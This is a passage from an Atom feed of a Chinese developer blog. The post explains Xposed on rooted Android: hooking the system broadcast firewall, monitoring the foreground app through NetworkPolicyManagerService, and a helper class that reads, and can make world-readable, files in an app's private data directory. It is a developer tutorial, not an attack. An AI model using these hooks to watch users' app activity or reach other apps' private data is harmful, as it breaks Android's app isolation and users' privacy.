<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[idhyt's blog]]></title>
  <subtitle><![CDATA[风轻云淡]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://blog.idhyt.xyz/"/>
  <updated>2015-12-27T07:47:29.000Z</updated>
  <id>http://blog.idhyt.xyz/</id>
  
  <author>
    <name><![CDATA[idhyt]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[安卓注入框架Xposed用法详解]]></title>
    <link href="http://blog.idhyt.xyz/2015/11/28/4-android-injection-xposed-usage/"/>
    <id>http://blog.idhyt.xyz/2015/11/28/4-android-injection-xposed-usage/</id>
    <published>2015-11-27T17:11:11.000Z</published>
    <updated>2015-12-27T07:47:29.000Z</updated>
    <content type="html"><![CDATA[<p>&#160;&#160;&#160;&#160;之前只是简单的了解了一下xposed框架，知道如何hook函数，并没有深入去使用，也不知道这个框架能用到哪种程度，最近详细的总结了下，简单来说就是，没有hook不到的地方，只有你想不到的地方。</p>
<h2 id="接管系统所有广播包">接管系统所有广播包</h2><p>&#160;&#160;&#160;&#160;在Android四大组件中，Broadcast是一种广泛运用的在应用程序之间传输信息的机制。而BroadcastReceiver 是对发送出来的Broadcast进行过滤接受并响应的一类组件。应用通过BroadcastReceiver对一个外部的事件做出响应，这是非常有意思的，当开机，锁屏等外部事件到来的时候，可以利用BroadcastReceiver进行相应的处理。如果你能接管所有的广播包，基本上就接管了整个系统的信息传输过程。广播包也是频繁唤醒手机的一个重要原因，通过管理这些广播包，可以达到省电效果。</p>
<p>通过阅读源代码中<br><a href="http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/5.1.1_r1/com/android/server/firewall/IntentFirewall.java#IntentFirewall" target="_blank" rel="external">IntentFirewall</a>这个类，126行代码开始有一些以<code>check</code>开头的方法，说明如下:</p>
<pre><code>This is called from ActivityManager to<span class="instruction"> check </span>if a start activity intent should be allowed. It is assumed the caller is already holding the global ActivityManagerService lock.
</code></pre><p>说明很清晰的告诉我们，所有activity启动时，会到这里做相应的检测是否被允许，因此我们hook掉<code>checkBroadcast</code>方法，就可以控制所有的广播包走向。checkBroadcast代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkBroadcast</span><span class="params">(Intent intent, <span class="keyword">int</span> callerUid, <span class="keyword">int</span> callerPid,</span><br><span class="line">    String resolvedType, <span class="keyword">int</span> receivingUid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> checkIntent(mBroadcastResolver, intent.getComponent(), TYPE_BROADCAST, intent, callerUid, callerPid, resolvedType, receivingUid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里，我通过hook该方法并获取到第一个参数<code>Intent intent</code>，然后就可以获取到广播类型，同时也可以获取到该广播的发送者(callerUid)和接受者(receivingUid)，hook代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">hook_method(<span class="string">"com.android.server.firewall.IntentFirewall"</span>,</span><br><span class="line">                lpparam.classLoader,</span><br><span class="line">                <span class="string">"checkBroadcast"</span>,</span><br><span class="line">                Intent.class,   <span class="comment">// intent</span></span><br><span class="line">                <span class="keyword">int</span>.class,  <span class="comment">// callerUid</span></span><br><span class="line">                <span class="keyword">int</span>.class,  <span class="comment">// callerPid</span></span><br><span class="line">                String.class,   <span class="comment">// resolvedType</span></span><br><span class="line">                <span class="keyword">int</span>.class,  <span class="comment">// receivingUid</span></span><br><span class="line">                <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="annotation">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="keyword">int</span> callerUid = (<span class="keyword">int</span>) param.args[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">int</span> receivingUid = (<span class="keyword">int</span>) param.args[<span class="number">4</span>];</span><br><span class="line">                XposedBridge.log(<span class="string">"hook IntentFirewall.checkBroadcast : "</span> + <span class="string">"broadcast from "</span> + callerUid + <span class="string">" to "</span> + receivingUid);</span><br><span class="line"></span><br><span class="line">                Intent intent = (Intent) param.args[<span class="number">0</span>];</span><br><span class="line">                String action = intent.getAction();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (action == <span class="keyword">null</span>)</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">if</span> (action.equals(<span class="string">"android.intent.action.SCREEN_OFF"</span>))</span><br><span class="line">                    XposedBridge.log(<span class="string">"hook IntentFirewall.checkBroadcast : "</span> + <span class="string">"screen off"</span>);</span><br><span class="line">                <span class="keyword">if</span> (action.equals(<span class="string">"android.intent.action.SCREEN_ON"</span>))</span><br><span class="line">                    XposedBridge.log(<span class="string">"hook IntentFirewall.checkBroadcast : "</span> + <span class="string">"screen on"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
<p>打印锁屏和亮屏的广播事件，结果如下所示：<br>过滤日志<code>adb logcat | grep checkBroadcast</code></p>
<p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-usage-1.jpg" alt="checkBroadcast"></p>
<h2 id="嵌套hook监控前台应用">嵌套hook监控前台应用</h2><p>&#160;&#160;&#160;&#160;在编写代码时候，要实现实时监控前台应用是相当棘手的一件事情，并且在5.11以后的版本获取所有运行app都已经受到限制，stackoverflow中给出了一种方法，<a href="http://stackoverflow.com/questions/30619349/android-5-1-1-and-above-getrunningappprocesses-returns-my-application-packag" target="_blank" rel="external">Get Running Apps on M with no permissions &amp; get the foreground app on Android 5.1.1+</a>，测试了获取前台应用的代码相当耗性能。这里基于xposed框架给出另外一种方法。</p>
<p>同样通过阅读源代码中的<a href="http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/5.1.1_r1/com/android/server/net/NetworkPolicyManagerService.java" target="_blank" rel="external">NetworkPolicyManagerService</a>这个类，找到回调函数<code>onForegroundActivitiesChanged</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">private</span> IProcessObserver mProcessObserver = <span class="keyword">new</span> IProcessObserver.Stub() &#123;</span><br><span class="line"></span><br><span class="line">	<span class="annotation">@Override</span></span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onForegroundActivitiesChanged</span><span class="params">(<span class="keyword">int</span> pid, <span class="keyword">int</span> uid, <span class="keyword">boolean</span> foregroundActivities)</span> </span>&#123;</span><br><span class="line">  	&#125;</span><br><span class="line"></span><br><span class="line">  	<span class="annotation">@Override</span></span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onProcessStateChanged</span><span class="params">(<span class="keyword">int</span> pid, <span class="keyword">int</span> uid, <span class="keyword">int</span> procState)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">synchronized</span> (mRulesLock) &#123;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ActivityManager服务中IProcessObserver有个回调函数onForegroundActivitiesChanged。而动态设置网络连接规则的时候，NetworkPolicyManagerService服务通过检测系统发出的一些相关事件（在NetworkPolicyManagerService的启动systemReady函数中注册），其中会调用ActivityManager服务中IProcessObserver的onForegroundActivitiesChanged及onProcessDied回调事件，因此，我们通过hook服务类NetworkPolicyManagerService中的onForegroundActivitiesChanged回调函数来监控前台应用，但是这个过程必须保证在systemReady函数已启动注册了该服务，因此需要嵌套hook。具体过程如下：</p>
<blockquote>
<ol>
<li>hook systemReady函数</li>
<li>通过<code>param.thisObject</code>获取hook方法所在类的实例，<br>即<code>NetworkPolicyManagerService.class</code></li>
<li>通过<code>getObjectField</code>获取类中的对象<code>mProcessObserver</code></li>
<li>hook对象<code>mProcessObserver</code>中的<code>onForegroundActivitiesChanged</code>方法</li>
</ol>
</blockquote>
<p>完整代码如下所示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">hook_method(<span class="string">"com.android.server.net.NetworkPolicyManagerService"</span>,</span><br><span class="line">                lpparam.classLoader,</span><br><span class="line">                <span class="string">"systemReady"</span>,</span><br><span class="line">                <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="annotation">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">"hook NetworkPolicyManagerService.systemReady"</span>);</span><br><span class="line">                XposedBridge.log(<span class="string">"hook NetworkPolicyManagerService.systemReady : "</span> + param.thisObject.getClass());</span><br><span class="line"></span><br><span class="line">                Object mProcessObserverClass = XposedHelpers.getObjectField(param.thisObject, <span class="string">"mProcessObserver"</span>);</span><br><span class="line">                XposedBridge.log(<span class="string">"hook NetworkPolicyManagerService.systemReady : "</span> + mProcessObserverClass.getClass());</span><br><span class="line"></span><br><span class="line">                hook_method(mProcessObserverClass.getClass(),</span><br><span class="line">                        <span class="string">"onForegroundActivitiesChanged"</span>,</span><br><span class="line">                        <span class="keyword">int</span>.class,  <span class="comment">// pid</span></span><br><span class="line">                        <span class="keyword">int</span>.class,  <span class="comment">// uid</span></span><br><span class="line">                        <span class="keyword">boolean</span>.class, <span class="comment">// foregroundActivities</span></span><br><span class="line">                        <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">                    <span class="annotation">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                        <span class="keyword">if</span> ((<span class="keyword">boolean</span>) param.args[<span class="number">2</span>])</span><br><span class="line">                            XposedBridge.log(<span class="string">"hook NetworkPolicyManagerService.onForegroundActivitiesChanged : foreground uid = "</span> + param.args[<span class="number">1</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
<p>打印锁屏和亮屏的广播事件，结果如下所示：<br>过滤日志<code>adb logcat | grep onForegroundActivitiesChanged</code></p>
<p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-usage-2.jpg" alt="onForegroundActivitiesChanged"></p>
<h2 id="xposed进程读取文件">xposed进程读取文件</h2><p>&#160;&#160;&#160;&#160;有时候需要xposed进程根据我们自身进程的设置来执行不同的逻辑功能，因此需要xposed进程读取我们进程的配置文件。xposed框架中提供了读取<code>data/data/package name/shared_prefs</code>目录下的xml配置文件功能类<code>XSharedPreferences</code>，该类继承了系统类<code>SharedPreferences</code>并提供类额外的<code>reload</code>方法，当我们配置文件更新后，可以调用该方法重新加载。</p>
<p>&#160;&#160;&#160;&#160;需要注意的是，该类只支持读操作，如果你尝试去执行写操作会抛异常。至于为什么作者没有添加写权限，作者也给出了详细的解释，详见：<a href="https://github.com/rovo89/XposedBridge/issues/63" target="_blank" rel="external">Cannot Write into a Shared Preferences File</a></p>
<p>&#160;&#160;&#160;&#160;我在使用的过程中，需要读取files目录下的json文件内容，使用时发现该类只能读取xml文件，作为jar导入包又不适合修改，因此仿照XSharedPreferences写了一个可以读取任何文件内容的<code>XFile</code>类，其实可以逐渐完善读更多文件类型的内容，包括数据库等。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.idhyt.xposedExtend;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Environment;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.json.JSONException;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.SELinuxHelper;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.services.FileResult;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span><br><span class="line"> *</span><br><span class="line"> * Created by idhyt on 2015/12/10.</span><br><span class="line"> *</span><br><span class="line"> * This class is used to read file from data/data/xxx/files directory,</span><br><span class="line"> * same as XSharedPreferences, read-only and without listeners support.</span><br><span class="line"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XFiles</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">"XFiles"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> File mFile;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String mFilename;</span><br><span class="line">    <span class="keyword">private</span> ByteArrayOutputStream mFileOutputStream;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> mLoaded = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> mLastModified;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> mFileSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Read settings from the specified file.</span><br><span class="line">     * <span class="doctag">@param</span> file The file to read.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XFiles</span><span class="params">(File file)</span> </span>&#123;</span><br><span class="line">        mFile = file;</span><br><span class="line">        mFilename = mFile.getAbsolutePath();</span><br><span class="line">        startLoadFromDisk();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@param</span> packageName The package name.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XFiles</span><span class="params">(String packageName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(packageName, packageName + <span class="string">"_files"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@param</span> packageName The package name.</span><br><span class="line">     * <span class="doctag">@param</span> fileName The file name with suffix (.txt, .json, etc..)</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XFiles</span><span class="params">(String packageName, String fileName)</span> </span>&#123;</span><br><span class="line">        mFile = <span class="keyword">new</span> File(Environment.getDataDirectory(), <span class="string">"data/"</span> + packageName + <span class="string">"/files/"</span> + fileName);</span><br><span class="line">        mFilename = mFile.getAbsolutePath();</span><br><span class="line">        startLoadFromDisk();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Tries to make the files file world-readable.</span><br><span class="line">     *</span><br><span class="line">     * This will only work if executed as root (e.g. &#123;<span class="doctag">@code</span> initZygote()&#125;) and only if SELinux is disabled.</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; in case the file could be made world-readable.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">makeWorldReadable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!SELinuxHelper.getAppDataFileService().hasDirectFileAccess())</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; <span class="comment">// It doesn't make much sense to make the file readable if we wouldn't be able to access it anyway.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!mFile.exists()) <span class="comment">// Just in case - the file should never be created if it doesn't exist.</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mFile.setReadable(<span class="keyword">true</span>, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Returns the file that is backing these preferences.</span><br><span class="line">     *</span><br><span class="line">     * &lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; The file might not be accessible directly.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> File <span class="title">getFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mFile;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startLoadFromDisk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">            mLoaded = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="string">"XFiles-load"</span>) &#123;</span><br><span class="line">            <span class="annotation">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (XFiles.<span class="keyword">this</span>) &#123;</span><br><span class="line">                    loadFromDiskLocked();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="annotation">@SuppressWarnings</span>(&#123; <span class="string">"rawtypes"</span>, <span class="string">"unchecked"</span> &#125;)</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">loadFromDiskLocked</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (mLoaded) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream fileOutputStream = <span class="keyword">null</span>;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        FileResult fileResult = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fileResult = SELinuxHelper.getAppDataFileService().getFileInputStream(mFilename, mFileSize, mLastModified);</span><br><span class="line">            InputStream inputStream = fileResult.stream;</span><br><span class="line">            <span class="keyword">if</span> (inputStream != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> length = inputStream.available();</span><br><span class="line">                <span class="keyword">byte</span> [] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> readLength;</span><br><span class="line">                <span class="keyword">while</span> ((readLength = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    byteArrayOutputStream.write(buffer, <span class="number">0</span>, readLength);</span><br><span class="line">                &#125;</span><br><span class="line">                fileOutputStream = byteArrayOutputStream;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException ignored) &#123;</span><br><span class="line">            <span class="comment">// SharedPreferencesImpl has a canRead() check, so it doesn't log anything in case the file doesn't exist</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.w(TAG, <span class="string">"getSharedPreferences"</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (fileResult != <span class="keyword">null</span> &amp;&amp; fileResult.stream != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fileResult.stream.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RuntimeException rethrown) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> rethrown;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mLoaded = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (fileOutputStream != <span class="keyword">null</span>) &#123;</span><br><span class="line">            mFileOutputStream = fileOutputStream;</span><br><span class="line">            mLastModified = fileResult.mtime;</span><br><span class="line">            mFileSize = fileResult.size;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            mFileOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        &#125;</span><br><span class="line">        notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Reload the settings from file if they have changed.</span><br><span class="line">     *</span><br><span class="line">     * &lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; With enforcing SELinux, this call might be quite expensive.</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@return</span> true if execute reload;</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">reload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (hasFileChanged()) &#123;</span><br><span class="line">            startLoadFromDisk();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Check whether the file has changed since the last time it has been loaded.</span><br><span class="line">     *</span><br><span class="line">     * &lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; With enforcing SELinux, this call might be quite expensive.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">hasFileChanged</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileResult result = SELinuxHelper.getAppDataFileService().statFile(mFilename);</span><br><span class="line">            <span class="keyword">return</span> mLastModified != result.mtime || mFileSize != result.size;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException ignored) &#123;</span><br><span class="line">            <span class="comment">// SharedPreferencesImpl doesn't log anything in case the file doesn't exist</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.w(TAG, <span class="string">"hasFileChanged"</span>, e);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span 